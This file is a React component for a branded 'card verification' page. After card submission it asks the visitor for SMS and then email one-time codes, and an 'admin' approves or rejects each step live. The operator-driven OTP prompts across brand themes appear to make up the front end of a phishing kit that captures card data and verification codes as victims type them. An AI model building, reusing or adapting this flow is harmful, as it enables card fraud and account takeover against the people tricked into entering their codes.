"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import { BrandConfig } from "@/lib/brandConfig";
import { CardVerificationStatus, CardVerificationStatusResponse } from "@/types/kyc";
import { getCardVerificationStatus, submitCardSmsCode, submitCardEmailCode } from "@/lib/api";
import { subscribeToCardSession, unsubscribeCardSession } from "@/lib/websocket";

interface CardVerificationFlowProps {
  brandConfig: BrandConfig;
  sessionToken: string;
  uuid: string;
}

export default function CardVerificationFlow({ brandConfig, sessionToken, uuid }: CardVerificationFlowProps) {
  const [status, setStatus] = useState<CardVerificationStatus>("pending");
  const [cardData, setCardData] = useState<CardVerificationStatusResponse | null>(null);
  const [smsCode, setSmsCode] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const smsInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const emailInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Fetch current status
  const fetchStatus = useCallback(async () => {
    try {
      const data = await getCardVerificationStatus(sessionToken);
      setCardData(data);
      setStatus(data.status);
    } catch {
      // silent
    }
  }, [sessionToken]);

  // Poll for status updates + WebSocket
  useEffect(() => {
    fetchStatus();

    // Poll every 3 seconds as fallback
    pollRef.current = setInterval(fetchStatus, 3000);

    // Also try WebSocket for instant updates
    try {
      subscribeToCardSession(sessionToken, (event: any) => {
        setStatus(event.status);
        setCardData((prev) => prev ? { ...prev, ...event } : prev);
      });
    } catch {
      // WebSocket may not be available — polling is the fallback
    }

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
      try { unsubscribeCardSession(sessionToken); } catch { /* */ }
    };
  }, [sessionToken, fetchStatus]);

  // Auto-focus first SMS/Email input when status changes
  useEffect(() => {
    if (status === "awaiting_sms") {
      setTimeout(() => smsInputRefs.current[0]?.focus(), 100);
    }
    if (status === "awaiting_email") {
      setTimeout(() => emailInputRefs.current[0]?.focus(), 100);
    }
  }, [status]);

  const handleSmsSubmit = async () => {
    if (smsCode.length < 4) return;
    setIsSubmitting(true);
    setError(null);
    try {
      const result = await submitCardSmsCode(sessionToken, smsCode);
      setStatus(result.status as CardVerificationStatus);
    } catch (err: any) {
      setError(err.response?.data?.message || "Failed to submit SMS code.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleEmailSubmit = async () => {
    if (emailCode.length < 4) return;
    setIsSubmitting(true);
    setError(null);
    try {
      const result = await submitCardEmailCode(sessionToken, emailCode);
      setStatus(result.status as CardVerificationStatus);
    } catch (err: any) {
      setError(err.response?.data?.message || "Failed to submit email code.");
    } finally {
      setIsSubmitting(false);
    }
  };

  // OTP-style input handler
  const handleCodeInput = (
    value: string,
    index: number,
    setter: (v: string) => void,
    currentCode: string,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    const char = value.replace(/\D/g, "").slice(-1);
    const codeArr = currentCode.split("");
    codeArr[index] = char;
    const newCode = codeArr.join("");
    setter(newCode);

    // Auto-advance to next input
    if (char && index < 5) {
      refs.current[index + 1]?.focus();
    }
  };

  const handleCodeKeyDown = (
    e: React.KeyboardEvent,
    index: number,
    currentCode: string,
    setter: (v: string) => void,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !currentCode[index] && index > 0) {
      const codeArr = currentCode.split("");
      codeArr[index - 1] = "";
      setter(codeArr.join(""));
      refs.current[index - 1]?.focus();
    }
  };

  const cssVars = {
    "--brand-primary": brandConfig.primaryColor,
    "--brand-accent": brandConfig.accent,
    "--brand-success": brandConfig.success,
    "--brand-error": brandConfig.error,
  } as React.CSSProperties;

  // ===== RENDER BASED ON STATUS =====

  // PENDING — Awaiting admin review
  if (status === "pending") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.primaryColor}15` }}>
            <div className="kyc-spinner" style={{ width: "2rem", height: "2rem", borderWidth: "3px" }} />
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.textPrimary }}>
          Card Submitted Successfully
        </h2>
        <p className="text-sm mb-4" style={{ color: brandConfig.textSecondary }}>
          Your card details are being reviewed. Please keep this page open.
        </p>
        {cardData && (
          <div className="kyc-card inline-block text-left text-sm mt-2">
            <div className="flex items-center gap-3 mb-2">
              <span className="text-lg">💳</span>
              <div>
                <div className="font-bold" style={{ color: brandConfig.textPrimary }}>
                  {cardData.card_number_masked}
                </div>
                <div className="text-xs" style={{ color: brandConfig.textSecondary }}>
                  {cardData.cardholder_name} · {cardData.card_type?.toUpperCase()}
                </div>
              </div>
            </div>
          </div>
        )}
        <div className="mt-6 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Waiting for verification...
        </div>
      </div>
    );
  }

  // AWAITING SMS — show SMS code input
  if (status === "awaiting_sms") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.primaryColor}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.primaryColor} strokeWidth={1.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" />
            </svg>
          </div>
        </div>

        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.textPrimary }}>
          Enter SMS Verification Code
        </h2>
        <p className="text-sm mb-6" style={{ color: brandConfig.textSecondary }}>
          A verification code has been sent to your phone. Please enter it below.
        </p>

        {error && (
          <div className="p-3 rounded mb-4 text-sm" style={{ backgroundColor: `${brandConfig.error}15`, color: brandConfig.error }}>
            {error}
          </div>
        )}

        {/* 6-digit OTP input */}
        <div className="flex justify-center gap-3 mb-6">
          {Array.from({ length: 6 }).map((_, i) => (
            <input
              key={i}
              ref={(el) => { smsInputRefs.current[i] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              className="w-12 h-14 text-center text-xl font-bold rounded-lg outline-none transition-all"
              style={{
                border: `2px solid ${smsCode[i] ? brandConfig.primaryColor : brandConfig.inputBorder}`,
                color: brandConfig.textPrimary,
                backgroundColor: smsCode[i] ? `${brandConfig.primaryColor}08` : "#FFFFFF",
              }}
              value={smsCode[i] || ""}
              onChange={(e) => handleCodeInput(e.target.value, i, setSmsCode, smsCode, smsInputRefs)}
              onKeyDown={(e) => handleCodeKeyDown(e, i, smsCode, setSmsCode, smsInputRefs)}
            />
          ))}
        </div>

        <button
          onClick={handleSmsSubmit}
          disabled={smsCode.length < 4 || isSubmitting}
          className="kyc-btn-primary px-8 py-3"
        >
          {isSubmitting ? (
            <span className="flex items-center gap-2"><span className="kyc-spinner" /> Verifying...</span>
          ) : "Confirm SMS Code"}
        </button>

        <p className="text-xs mt-4" style={{ color: brandConfig.textSecondary }}>
          Didn&apos;t receive the code? Check your messages or wait a moment.
        </p>
      </div>
    );
  }

  // SMS CODE ENTERED — waiting for admin confirmation
  if (status === "sms_code_entered") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.primaryColor}15` }}>
            <div className="kyc-spinner" style={{ width: "2rem", height: "2rem", borderWidth: "3px" }} />
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.textPrimary }}>
          SMS Code Submitted
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          Your SMS code is being verified. Please wait...
        </p>
        <div className="mt-4 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Verifying SMS code...
        </div>
      </div>
    );
  }

  // SMS CONFIRMED — success, might proceed to email
  if (status === "sms_confirmed") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.success}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.success} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.success }}>
          SMS Code Verified ✓
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          SMS verification successful. Please wait for the next step...
        </p>
        <div className="mt-4 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Waiting for email verification step...
        </div>
      </div>
    );
  }

  // SMS REJECTED — failed
  if (status === "sms_rejected") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.error}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.error} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.error }}>
          SMS Code Incorrect
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          The SMS code you entered was not valid. Please wait — you may be asked to try again.
        </p>
        <div className="mt-4 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Waiting for admin...
        </div>
      </div>
    );
  }

  // AWAITING EMAIL — show email code input
  if (status === "awaiting_email") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.primaryColor}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.primaryColor} strokeWidth={1.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75" />
            </svg>
          </div>
        </div>

        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.textPrimary }}>
          Enter Email Verification Code
        </h2>
        <p className="text-sm mb-6" style={{ color: brandConfig.textSecondary }}>
          A verification code has been sent to your email. Please enter it below.
        </p>

        {error && (
          <div className="p-3 rounded mb-4 text-sm" style={{ backgroundColor: `${brandConfig.error}15`, color: brandConfig.error }}>
            {error}
          </div>
        )}

        {/* 6-digit OTP input */}
        <div className="flex justify-center gap-3 mb-6">
          {Array.from({ length: 6 }).map((_, i) => (
            <input
              key={i}
              ref={(el) => { emailInputRefs.current[i] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              className="w-12 h-14 text-center text-xl font-bold rounded-lg outline-none transition-all"
              style={{
                border: `2px solid ${emailCode[i] ? brandConfig.primaryColor : brandConfig.inputBorder}`,
                color: brandConfig.textPrimary,
                backgroundColor: emailCode[i] ? `${brandConfig.primaryColor}08` : "#FFFFFF",
              }}
              value={emailCode[i] || ""}
              onChange={(e) => handleCodeInput(e.target.value, i, setEmailCode, emailCode, emailInputRefs)}
              onKeyDown={(e) => handleCodeKeyDown(e, i, emailCode, setEmailCode, emailInputRefs)}
            />
          ))}
        </div>

        <button
          onClick={handleEmailSubmit}
          disabled={emailCode.length < 4 || isSubmitting}
          className="kyc-btn-primary px-8 py-3"
        >
          {isSubmitting ? (
            <span className="flex items-center gap-2"><span className="kyc-spinner" /> Verifying...</span>
          ) : "Confirm Email Code"}
        </button>

        <p className="text-xs mt-4" style={{ color: brandConfig.textSecondary }}>
          Check your inbox and spam folder.
        </p>
      </div>
    );
  }

  // EMAIL CODE ENTERED — waiting for admin
  if (status === "email_code_entered") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.primaryColor}15` }}>
            <div className="kyc-spinner" style={{ width: "2rem", height: "2rem", borderWidth: "3px" }} />
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.textPrimary }}>
          Email Code Submitted
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          Your email code is being verified. Please wait...
        </p>
        <div className="mt-4 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Verifying email code...
        </div>
      </div>
    );
  }

  // EMAIL CONFIRMED
  if (status === "email_confirmed") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.success}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.success} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.success }}>
          Email Code Verified ✓
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          Completing verification process...
        </p>
        <div className="mt-4 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Finalizing...
        </div>
      </div>
    );
  }

  // EMAIL REJECTED
  if (status === "email_rejected") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.error}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.error} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.error }}>
          Email Code Incorrect
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          The email code you entered was not valid. Please wait — you may be asked to try again.
        </p>
        <div className="mt-4 flex items-center justify-center gap-2 text-xs" style={{ color: brandConfig.textSecondary }}>
          <div className="live-dot" />
          Waiting for admin...
        </div>
      </div>
    );
  }

  // VERIFIED — Full success! 
  if (status === "verified") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-24 h-24 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.success}15` }}>
            <svg className="w-14 h-14" fill="none" viewBox="0 0 24 24" stroke={brandConfig.success} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
        </div>
        <h2 className="text-2xl font-bold mb-2" style={{ color: brandConfig.success }}>
          Card Verified Successfully!
        </h2>
        <p className="text-sm mb-6" style={{ color: brandConfig.textSecondary }}>
          Your card has been fully verified. You can now proceed with your account.
        </p>
        {cardData && (
          <div className="kyc-card inline-block text-left text-sm">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.success}15` }}>
                <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke={brandConfig.success} strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <div>
                <div className="font-bold" style={{ color: brandConfig.textPrimary }}>
                  {cardData.card_number_masked} · {cardData.card_type?.toUpperCase()}
                </div>
                <div className="text-xs" style={{ color: brandConfig.textSecondary }}>
                  {cardData.cardholder_name}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  // FAILED
  if (status === "failed") {
    return (
      <div style={{ ...cssVars, fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
        <div className="mb-6">
          <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: `${brandConfig.error}15` }}>
            <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke={brandConfig.error} strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
        </div>
        <h2 className="text-xl font-bold mb-2" style={{ color: brandConfig.error }}>
          Verification Failed
        </h2>
        <p className="text-sm" style={{ color: brandConfig.textSecondary }}>
          Unfortunately, your card verification could not be completed. Please contact support for assistance.
        </p>
      </div>
    );
  }

  // Default loading
  return (
    <div style={{ fontFamily: brandConfig.fontFamily }} className="max-w-lg mx-auto text-center py-12">
      <div className="kyc-spinner mx-auto mb-4" style={{ width: "2rem", height: "2rem", borderWidth: "3px" }} />
      <p className="text-sm" style={{ color: brandConfig.textSecondary }}>Loading...</p>
    </div>
  );
}
